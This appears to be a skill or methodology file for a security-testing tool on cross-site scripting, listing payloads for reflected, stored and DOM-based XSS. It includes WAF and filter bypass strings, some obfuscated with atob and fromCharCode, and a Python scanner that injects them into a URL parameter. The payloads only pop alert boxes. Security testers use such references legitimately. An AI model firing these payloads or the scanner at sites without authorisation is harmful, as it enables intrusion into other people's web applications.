---
name: xss
description: Cross-Site Scripting (XSS) testing methodology with payloads for reflected, stored, and DOM-based XSS
version: 1.0.0
tags: [injection, client-side, A03:2021]
---

# XSS Testing Methodology

## Overview
Cross-Site Scripting allows attackers to inject malicious scripts into web pages viewed by other users.

## Types
1. **Reflected XSS**: Payload reflected in immediate response
2. **Stored XSS**: Payload stored and executed later
3. **DOM-based XSS**: Payload executed via client-side JavaScript

## Testing Methodology

### 1. Identify Input Points
- URL parameters
- Form inputs
- HTTP headers (User-Agent, Referer)
- Cookies
- File upload names

### 2. Test Basic Payloads
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
```

### 3. Context-Specific Payloads

#### HTML Context
```
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<body onload=alert(1)>
```

#### Attribute Context
```
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
" onfocus=alert(1) autofocus="
```

#### JavaScript Context
```
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

#### URL Context
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### 4. WAF Bypass Techniques
```
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>
<img src=x onerror=\u0061lert(1)>
```

### 5. Filter Bypass
```
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
```

## PoC Template
```python
import requests

def test_xss(url, param):
    payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
    ]
    
    for payload in payloads:
        r = requests.get(url, params={param: payload})
        if payload in r.text:
            print(f"[+] XSS found with: {payload}")
            return True
    return False
```

## Impact
- Session hijacking
- Account takeover
- Defacement
- Keylogging
- Phishing
